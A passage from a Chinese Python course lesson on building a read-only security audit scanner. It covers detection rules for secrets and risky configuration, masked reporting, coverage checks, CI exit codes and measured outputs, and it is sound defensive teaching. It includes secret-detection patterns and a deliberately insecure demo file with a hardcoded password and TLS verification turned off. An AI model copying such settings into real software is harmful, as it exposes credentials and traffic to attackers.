    B -->|否| Z[FileNotFoundError]
    B -->|是| C[os.walk followlinks=False]
    C --> D[目录黑名单过滤]
    D --> E{文件数 >= max_files?}
    E -->|是| T[truncated=True 停止]
    E -->|否| F{符号链接?}
    F -->|是且未允许| S1[skipped: symlink]
    F -->|否| G{大小 > max_bytes?}
    G -->|是| S2[skipped: too_large]
    G -->|否| H{后缀是二进制类型?}
    H -->|是| S3[skipped: binary]
    H -->|否| I[read_bytes]
    I --> J{能 utf-8 解码?}
    J -->|否| S4[skipped: not_utf8]
    J -->|是| K[逐行正则匹配规则]
    K --> L[make_finding: 掩码 + 指纹]
    L --> M{在 baseline 中?}
    M -->|是| N[suppressed]
    M -->|否| O[findings]
    S1 --> P[Coverage]
    S2 --> P
    S3 --> P
    S4 --> P
    T --> P
    N --> Q[AuditReport]
    O --> Q
```

三个设计细节：

1. **`followlinks=False`**：不跟随符号链接目录，避免顺着 `link → /etc` 走出审计范围。
   文件级符号链接也默认跳过并计数。
2. **二进制后缀判断在读取之前**：省 IO；代价是"文本内容改了 .png 后缀"会漏，
   这是有意的取舍（宁可漏一个，也不要每次都把 500 MB 的镜像读进内存）。
3. **`consume()` 内部吞掉 OSError 但记录到 `errors`**：
   单个文件读不了不能让整次审计崩掉，但也不能静默忽略。

### 5.2 规则库（13 条，四类）

| 类别 | 规则 id | 严重度 | 置信度 | 匹配形态 |
|---|---|---|---|---|
| secret | `secret_private_key` | critical | high | `-----BEGIN ... PRIVATE KEY-----` |
| secret | `secret_cloud_access_key` | critical | high | `AKIA` + 16 位 |
| secret | `secret_hardcoded_credential` | high | medium | `password/token/api_key = "…"` |
| secret | `secret_bearer_jwt` | medium | medium | `eyJ…`.`…`.`…` |
| config | `config_debug_enabled` | medium | high | 行首 `DEBUG = True/1/on` |
| config | `tls_verify_disabled` | high | high | `verify=False` |
| config | `tls_legacy_protocol` | medium | high | `TLSv1.0/1.1`、`SSLv3` |
| config | `world_writable_chmod` | high | medium | `chmod 777/666/a+rwx` |
| crypto | `weak_hash_or_cipher` | low | low | `md5/sha1/des/rc4` |
| code | `shell_exec_enabled` | medium | high | `shell=True` |
| code | `dynamic_eval` | medium | low | `eval(` / `exec(` |
| supply | `insecure_package_index` | medium | high | `index-url = http://…` |
| supply | `unpinned_dependency` | low | medium | `requirements*.txt` 中无版本行 |

**规则编写要点（踩过的坑）**：

- 凭据规则**不能**写 `\bpassword\b`：变量名常见写法是 `DB_PASSWORD`，
  下划线是单词字符，`\b` 会把最常见的情况直接漏掉（本课规则里写了注释说明）。
- 依赖规则必须带 `file_glob='requirements*.txt'`，否则全仓库每一行都会被匹配。
- 弱算法规则用 `(?i)` 但要给低置信度：`MD5` 出现在文档里也会命中。

### 5.3 匹配的粒度与去重

```python
inspect_text(name, text, rules, baseline)
  → 逐行 re.finditer(pattern, line, flags)
  → 每个匹配生成一个 Finding(rule_id, path, line, masked, sha256)
  → dedupe(): 以 (rule_id, path, line) 为键去重
```

为什么用 `(rule_id, path, line)` 而不是整行内容？
因为同一行里出现两次相同值（例如一行写了两个 `password=`）属于**同一处问题**，
去重后复核人员只看一次；而同一行触发**不同规则**时必须都保留——它们是不同问题。

### 5.4 覆盖统计字段

| 字段 | 含义 | 为什么重要 |
|---|---|---|
| `files_scanned` | 成功读取并解析的文件数 | 报告里唯一能证明"真的扫了"的数字 |
| `bytes_read` | 累计读取字节 | 异常大或异常小都提示范围不对 |
| `skipped: {reason: n}` | 跳过分类计数 | 四类：`too_large` / `binary` / `not_utf8` / `symlink` |
| `errors: [..]` | 读取失败的文件 | 权限问题往往出现在最需要审计的地方 |
| `truncated` | 是否达到 `max_files` | 静默截断 = 用"没扫完"冒充"没问题" |
| `complete` | 上述是否全空 | 唯一的"结果可用于下结论"的开关 |
| `gaps` | 人类可读的缺口列表 | 直接进报告的覆盖声明段 |

### 5.5 报告的三层结构

```text
summary   {findings, suppressed, by_severity, by_triage_band}   ← 一眼看规模
coverage  {files_scanned, skipped, errors, complete, gaps}      ← 结论可信度
findings  [ {rule, severity, confidence, priority, band,
             path, line, masked, evidence_sha256,
             why, remediation, cwe} ]                           ← 复核依据
```

Markdown 渲染顺序刻意是：**摘要 → 覆盖声明 → 命中明细 → 抑制清单 → 免责声明**。
覆盖声明必须在明细**之前**，因为它决定了明细能不能被当作结论使用。

### 5.6 门禁退出码

| 退出码 | 含义 | CI 中的反应 |
|---|---|---|
| 0 | 无达到阈值的命中，且覆盖完整 | 通过 |
| 2 | 用法错误 / 目标不存在 | 修流水线配置 |
| 3 | 存在严重度 ≥ `--fail-on` 的命中 | 派人处理，或加 baseline（需评审） |
| 4 | 覆盖不全 | **先修工具/权限**，结果暂不可信 |

优先级：`2 > 4 > 3 > 0`。把 4 排在 3 之前，是这份设计里最容易被忽略、
也最重要的一条：**不可信的结果不配当门禁依据。**

### 5.7 快速开始

```bash
cd ~/code/Learn-Python
D=days/day-159-security-audit-toolkit/code

python3 $D/01-scanner-core.py --self-test      # 规则引擎基础（内存样本）
python3 $D/02-report-builder.py --self-test    # 报告生成与覆盖声明
python3 $D/03-audit-toolkit.py --self-test     # CLI 整合
python3 $D/03-audit-toolkit.py rules           # 查看 13 条规则
python3 $D/03-audit-toolkit.py lab             # 临时目录演示项目 → 报告 + 退出码 3
python3 $D/03-audit-toolkit.py scan ./your-project --fail-on high
python3 $D/03-audit-toolkit.py scan ./your-project --format json --output /tmp/audit.json
python3 $D/03-audit-toolkit.py report /tmp/audit.json --format markdown
```

无第三方依赖，Python 3.10+ 即可（本仓库在 3.12 上验证）。
## 6. 定义与使用方法（API 速查）

### 6.1 数据结构

| 结构 | 字段 | 说明 |
|---|---|---|
| `Rule` | `id / title / severity / confidence / category / why / remediation / cwe / pattern / file_glob / flags` | `frozen=True`；构造时校验 severity 与 confidence 合法性 |
| `Finding` | `rule_id / title / severity / confidence / category / cwe / path / line / masked / evidence_sha256 / why / remediation` | **没有 raw 字段**（结构性脱敏）；`key` = `(rule_id, path, line)`；`band` 属性 |
| `Coverage` | `files_scanned / bytes_read / skipped / errors / truncated / complete / gaps` | `complete` 与 `gaps` 是派生属性 |
| `AuditReport` | `root / findings / suppressed / coverage / rules_evaluated` | `by_severity()` / `by_band()` / `at_or_above(t)` / `to_dict()` |

### 6.2 函数速查

| 函数 | 签名要点 | 用途 |
|---|---|---|
| `local_rules()` | `→ list[Rule]` | 内置 13 条规则（每次返回新列表，可安全追加） |
| `priority(sev, conf)` | `→ int 1..15` | triage 分值 |
| `triage_band(sev, conf)` | `→ 'P0'..'P3'` | 分档（≥12 P0、≥8 P1、≥4 P2、其余 P3） |
| `mask(value, keep=4, cap=32)` | `→ str` | 脱敏；超长截断并附 `(len=N)` |
| `fingerprint(value)` | `→ str(16)` | SHA-256 前 16 位，跨报告比对用 |
| `inspect_text(name, text, rules, baseline=())` | `→ (findings, suppressed)` | 审计一段文本（内存，无 IO） |
| `scan_path(root, rules=None, *, max_files=1000, max_bytes=1MiB, baseline=(), exclude_dirs=None, allow_symlinks=False)` | `→ AuditReport` | 只读扫描文件/目录 |
| `dedupe(findings)` | `→ list` | 按 `(rule_id, path, line)` 去重 |
| `summarize(report)` | `→ str` | 一行摘要（含覆盖状态） |

### 6.3 报告层函数（`02-report-builder.py`）

| 函数 | 用途 |
|---|---|
| `escape_md(text)` | 转义 `|` 与反引号，防止文件名切碎 Markdown 表格 |
| `sort_findings(findings)` | 优先级降序 → 路径 → 行号 |
| `load_baseline(path)` | 读 baseline 文件（`#` 注释；空行忽略） |
| `coverage_warning(report)` | 生成覆盖声明（完整时也给正面声明） |
| `render_markdown(report, title)` | 人类可读报告 |
| `gate_exit_code(report, fail_on)` | CI 门禁退出码 0/3/4 |

### 6.4 CLI 速查（`03-audit-toolkit.py`）

| 子命令 | 参数 | 说明 |
|---|---|---|
| `scan <target>` | `--format {markdown,json}` `--fail-on {low,medium,high,critical}` `--baseline FILE` `--max-files N` `--max-bytes N` `--output FILE` | 扫描并输出报告；退出码即门禁结果 |
| `report <report.json>` | `--format {markdown,json}` | 由 JSON 重新渲染（复核人员无需重扫） |
| `rules` | — | 打印规则库（id/严重度/置信度/类别/CWE） |
| `lab` | `--format` `--fail-on` | 临时目录生成演示项目并扫描，退出即清理 |
| `--self-test` | — | 自测，输出 `SELF-TEST OK` |

### 6.5 baseline 文件格式

```text
# 已知并接受的风险（需评审 + 复查日期）
secret_hardcoded_credential:docs/notes.md      # 按"规则:路径"抑制
world_writable_chmod:deploy/fix_perms.sh
secret_cloud_access_key:1a5d44a2dca19669       # 按"规则:证据指纹"抑制
```

三种键都支持：`rule:path`、`rule:sha256`、`rule:path:line`。

## 7. 运行命令 + 真实预期输出（实测）

> 本节所有输出都是**在本机真实跑出来的**（Python 3.12），不是手写示意。
> `-B` 表示不生成 `__pycache__`，保证"跑完不留产物"。
> 所有演示的临时文件都落在 `tempfile.TemporaryDirectory()` 里，**不污染仓库工作树**。

### 7.0 准备

```bash
cd /root/code/Learn-Python
D=days/day-159-security-audit-toolkit/code
```

### 7.1 三个脚本的自检（必跑，必须逐行输出 `SELF-TEST OK`）

```bash
python3 -B $D/01-scanner-core.py --self-test
python3 -B $D/02-report-builder.py --self-test
python3 -B $D/03-audit-toolkit.py --self-test
```

实测输出（三行，逐字）：

```text
SELF-TEST OK
SELF-TEST OK
SELF-TEST OK
```

自检**完全离线**：不联网、不读仓库外文件、不写仓库；`03` 的自检会在临时目录里搭建样例项目并扫描。

> `audit_core.py` 是**被 import 的核心库**，不是 CLI 入口，它没有 `--self-test`（直接执行会静默退出 0、不输出 OK）。它的行为由上面三个脚本的断言覆盖。

### 7.2 规则库

```bash
python3 -B $D/03-audit-toolkit.py rules
```

实测输出：

```text
RULE                           SEV       CONF    CAT      CWE
------------------------------------------------------------------------------
secret_private_key             critical  high    secret   CWE-798
secret_cloud_access_key        critical  high    secret   CWE-798
secret_hardcoded_credential    high      medium  secret   CWE-798
secret_bearer_jwt              medium    medium  secret   CWE-798
config_debug_enabled           medium    high    config   CWE-489
tls_verify_disabled            high      high    config   CWE-295
tls_legacy_protocol            medium    high    config   CWE-327
weak_hash_or_cipher            low       low     crypto   CWE-327
shell_exec_enabled             medium    high    code     CWE-78
dynamic_eval                   medium    low     code     CWE-95
world_writable_chmod           high      medium  config   CWE-732
insecure_package_index         medium    high    supply   CWE-494
unpinned_dependency            low       medium  supply   CWE-1104

共 13 条规则（教学基线，按业务调整）。
```

> 与 5.2 节的规则表逐行一致——**规则数量、严重度、置信度、CWE 都必须和代码对得上**，这是写文档时最容易失真的地方。

### 7.3 基础示例：内存样本 → 命中表

```bash
python3 -B $D/01-scanner-core.py
```

实测输出（完整）：

```text
规则数: 13  样本文件: 7
PRI BAND SEVERITY CONF   RULE                         LOCATION                 EVIDENCE
---------------------------------------------------------------------------------------
 15 P0   critical high   secret_cloud_access_key      app/legacy_client.py:1   AKIA****************
 12 P0   high     high   tls_verify_disabled          app/settings.py:5        veri********
  9 P1   medium   high   config_debug_enabled         app/settings.py:2        DEBU********
  9 P1   medium   high   shell_exec_enabled           app/settings.py:6        shel******
  9 P1   medium   high   insecure_package_index       deploy/pip.conf:2        inde***************
  8 P1   high     medium secret_hardcoded_credential  app/legacy_client.py:1   API_****************************
  8 P1   high     medium secret_hardcoded_credential  app/legacy_client.py:2   TOKE********(len=67)
  8 P1   high     medium secret_hardcoded_credential  app/settings.py:3        PASS**************************
  8 P1   high     medium world_writable_chmod         deploy/chmod.sh:2        chmo*****
  8 P1   high     medium secret_hardcoded_credential  docs/README.md:1         pass**********************
  6 P2   medium   medium secret_bearer_jwt            app/legacy_client.py:2   eyJh********(len=57)
  4 P2   low      medium unpinned_dependency          requirements.txt:1       requ****
  3 P3   medium   low    dynamic_eval                 app/plugin_loader.py:2   eval*
  2 P3   low      low    weak_hash_or_cipher          docs/README.md:2         ***

命中合计: 14 条，抑制: 0 条
提醒：命中只是复核线索，不是漏洞结论；文档/注释也会命中。
```

读这份输出时注意三处：

- `AKIA****************`：保留前 4 位、其余 16 位变星号——**能在日志里定位到它，但不足以还原**；
- `TOKE********(len=67)`：命中值超过 `cap=32` 就截断并附上原始长度，避免一条命中把表格撑爆；
- 最后两行：`dynamic_eval` 来自 `app/plugin_loader.py`（低置信度提示），`weak_hash_or_cipher` 来自 **`docs/README.md`**——**故意保留的纯文档误报样本**，对应 4.14 的"语义反转 / 用途无害"。

### 7.4 报告生成：覆盖不全时，声明必须排在明细之前

```bash
python3 -B $D/02-report-builder.py
```

实测输出（节选）：

```text
findings=5 [low=2 medium=1 high=2] suppressed=0 覆盖不全
覆盖缺口: ['skipped:binary=1', 'skipped:not_utf8=1', 'skipped:symlink=1', 'skipped:too_large=1']

# 安全审计报告（样例项目）

- 目标根目录：`demo-project`（报告只保留末级目录名）
- 评估规则数：13
- 命中：5 条（其中被 baseline 抑制 0 条）
- 严重度分布：low=2、medium=1、high=2
- 优先级分布：P0=1 P1=2 P2=2 P3=0
- 覆盖：**不全** ⚠️
  - 缺口：skipped:binary=1、skipped:not_utf8=1、skipped:symlink=1、skipped:too_large=1
  - 含义：上述范围内的文件**没有被检查**，本次报告不能用于得出「未发现问题」的结论。

## 命中明细（按优先级排序）

### [P0] tls_verify_disabled — 关闭 TLS 证书校验

- 位置：`app/settings.py:3`
- 证据：`veri********`（sha256:f069d11494dad698）
```

这个脚本会在临时目录里**自己造出四类跳过**（超大文件、二进制、非法编码、符号链接），所以 `complete=False`——**这正是"0 命中 ≠ 安全"的现场演示**。

### 7.5 端到端演示：`lab`（临时目录搭建 → 扫描 → 退出码）

```bash
python3 -B $D/03-audit-toolkit.py lab; echo "退出码=$?"
```

实测输出（节选）：

```text
# 安全审计报告 — demo-project

- 目标根目录：`demo-project`（报告只保留末级目录名）
- 评估规则数：13
- 命中：11 条（其中被 baseline 抑制 2 条）
- 严重度分布：low=1、medium=4、high=4、critical=2
- 优先级分布：P0=3 P1=6 P2=2 P3=0
- 覆盖：完整（无跳过、无读取错误、未达到文件上限）

## 命中明细（按优先级排序）

### [P0] secret_cloud_access_key — 疑似云平台 Access Key

- 位置：`app/legacy_client.py:1`
- 证据：`AKIA****************`（sha256:1a5d44a2dca19669）
```

stderr（摘要与退出码）：

```text
# findings=11 [low=1 medium=4 high=4 critical=2] suppressed=2 覆盖完整

# 演示项目退出码 = 3（0=通过 3=命中达到阈值 4=覆盖不全）
```

退出码为 `3`。

注意 `suppressed=2`：演示项目里的 `docs/notes.md`（文档占位符）与 `deploy/fix_perms.sh`（已接受的权限）被 `ignore.txt` 抑制——它们**没有消失**，报告里单独列出一节（见 6.5）。

### 7.6 扫描你自己的项目 → JSON 中间产物 → 重新渲染

先造一个三行的最小项目（在**临时目录**里，不碰仓库）：

```bash
T=$(mktemp -d); mkdir -p "$T/proj/app"
cat > "$T/proj/app/settings.py" <<'EOF'
DEBUG = True
DB_PASSWORD = "ChangeMe-Demo-123"
requests.get(url, verify=False)
EOF
```

扫描（Markdown 到 stdout，摘要到 stderr，退出码即门禁结果）：

```bash
python3 -B $D/03-audit-toolkit.py scan "$T/proj" --fail-on high
```

实测输出：

```text
# findings=3 [medium=1 high=2] suppressed=0 覆盖完整        ← stderr 摘要

# 安全审计报告 — proj

- 目标根目录：`proj`（报告只保留末级目录名）
- 评估规则数：13
- 命中：3 条（其中被 baseline 抑制 0 条）
- 严重度分布：medium=1、high=2
- 优先级分布：P0=1 P1=2 P2=0 P3=0
- 覆盖：完整（无跳过、无读取错误、未达到文件上限）

## 命中明细（按优先级排序）

### [P0] tls_verify_disabled — 关闭 TLS 证书校验

- 位置：`app/settings.py:3`
- 证据：`veri********`（sha256:f069d11494dad698）
```

落 JSON，再喂给 `report` 重新渲染（**复核人员不需要重扫**）：

```bash
python3 -B $D/03-audit-toolkit.py scan "$T/proj" --format json --output "$T/audit.json" --fail-on high; echo "退出码=$?"
python3 -B $D/03-audit-toolkit.py report "$T/audit.json" --format markdown
```

实测：

```text
# findings=3 [medium=1 high=2] suppressed=0 覆盖完整
报告已写入 /tmp/tmp.wpYIie2LFJ/audit.json
退出码=3
```

```text
# 安全审计报告（由 JSON 重新渲染）

- 目标根目录：`proj`（报告只保留末级目录名）
- 评估规则数：13
- 命中：3 条（其中被 baseline 抑制 0 条）
- 严重度分布：medium=1、high=2
- 优先级分布：P0=1 P1=2 P2=0 P3=0
- 覆盖：完整（无跳过、无读取错误、未达到文件上限）
```

JSON 结构（实测节选）：

```json
{
  "root": "/tmp/tmp.wpYIie2LFJ/proj",
  "rules_evaluated": [
    "secret_private_key",
    "secret_cloud_access_key",
    ...
    "unpinned_dependency"
  ],
  "summary": {
    "findings": 3,
    "suppressed": 0,
    "by_severity": { "info": 0, "low": 0, "medium": 1, "high": 2, "critical": 0 },
    "by_triage_band": { "P0": 1, "P1": 2, ...
```

> ⚠️ JSON 里的 `root` 是**绝对路径**。它是机器接口（给 CI / 工单），可以保留；但**转发给人看的 Markdown 报告只保留末级目录名**（`proj`）——这正是 3.2 节"报告不泄露内部拓扑"的落点。

### 7.7 退出码实测对照

| 场景 | 命令 | 实测退出码 |
|---|---|---|
| 演示项目（覆盖完整 + 有 critical/high） | `03-audit-toolkit.py lab` | **3** |
| 临时项目 `--fail-on high`（有 high 命中） | `scan "$T/proj" --fail-on high` | **3** |
| 临时项目 `--fail-on critical`（无 critical 命中） | `scan "$T/proj" --fail-on critical` | **0** |
| 样例项目（有跳过 → 覆盖不全） | `02-report-builder.py`（内部 `gate_exit_code` 断言） | 报告声明不全；门禁返回 **4** |
| 目标不存在 | `scan /nonexistent` | **2** |

优先级 `2 > 4 > 3 > 0`：**不可信的结果不配当门禁依据**。


## 8. 实战流程（六步）

1. **定范围**：明确审计目标的边界（哪个目录、哪个仓库、哪台机器的哪份副本），
   拿到授权记录。范围外的目录用黑名单挡住。
2. **快照去噪声**：优先扫描**离线副本**或 Git 工作区，避免扫到
   `.venv`、`node_modules`、构建产物这类必定产生噪声的目录。
3. **扫描**：`scan --format json --output audit.json`，把 JSON 作为唯一的
   机器可信中间产物（后续 diff、归档、工单都用它）。
4. **先读覆盖，再读命中**：`coverage.complete` 为 false 时，
   先把 `gaps` 处理掉（提高 `--max-bytes`、补权限、缩小范围），
   再谈命中项。
5. **按优先级复核**：P0/P1 逐条人工确认——值是真的凭据还是示例？
   调用是否真的接收外部输入？确认后再进整改流程。
6. **写 baseline 并留痕**：确认为误报或已接受的，写进 baseline 文件
   （带原因与复查日期），提交进版本控制；不要用"删除规则"来消除噪音。

## 9. 常见陷阱（对照表）

| 陷阱 | 症状 | 正确做法 |
|---|---|---|
| 报告写绝对路径/主机名 | 转发即泄露内部拓扑 | 只保留末级目录名 + 相对路径 |
| 打印命中的原始行 | 明文凭据进 CI 日志 | 只输出 `masked` + `evidence_sha256` |
| 覆盖不全仍写"未发现问题" | 漏掉的正是问题所在 | `complete == False` 时强制声明缺口 |
| Markdown 不转义 | 文件名里的 `|` 切碎表格 | 统一 `escape_md()` |
| 空结果无输出 | 分不清"没命中"和"没跑" | 空结果也输出摘要行 |
| baseline 直接过滤 | 无人知道接受过多少风险 | 抑制项单独计数并列出 |
| 默认扫全盘 | 越权 + 噪声淹没 | 必须显式指定目标，默认黑名单 |
| 用命中数考核 | 有人会去关规则 | 考核"高危命中确认时长 + 复发率" |
| 自动处置 | 误报升级为生产事故 | 发现与处置分权限，工具只读 |

## 10. 局限（必须写进报告，不能省略）

- **纯模式匹配**：看不见数据流（外部输入是否真的到达危险调用）、
  看不见运行时行为、看不见权限关系。
- **无漏洞利用验证**：命中项未被证实可利用；也不判断实际影响面。
- **规则是教学基线**：13 条远不及生产规则集，需按业务补充。
- **不解析压缩包/二进制**：压缩包里的凭据、图片马、二进制配置都看不见。
- **未评测检出率**：没有在带标签的真实样本集上计算 precision/recall，
  因此**不能**替代生产审计产品，也不能作为合规结论的依据。

## 11. 思考题

1. 报告里，文档误报（`docs/notes.md` 的 `password = "example-value"`）与
   真实私钥命中看起来同样"严重"。这对"用命中数考核团队"意味着什么？
2. 如果允许审计工具自动处置（自动改 chmod、自动删密钥），
   哪一类故障会从"漏报"升级成"生产事故"？
3. 退出码把"覆盖不全(4)"排在"命中(3)"之前。请举一个**反例场景**，
   说明在某些组织里这个优先级可能需要调整，以及调整的代价。
4. 本课 13 条规则全是模式匹配。请列出至少三类它**结构上**看不见的风险，
   并各给一个"纯模式匹配会产生误判"的具体例子。
5. `baseline` 里的抑制项如果长期不复查，会发生什么？
   请设计一个能让"抑制腐化"暴露出来的机制（提示：报告里加哪些字段、
   CI 里加哪条检查）。
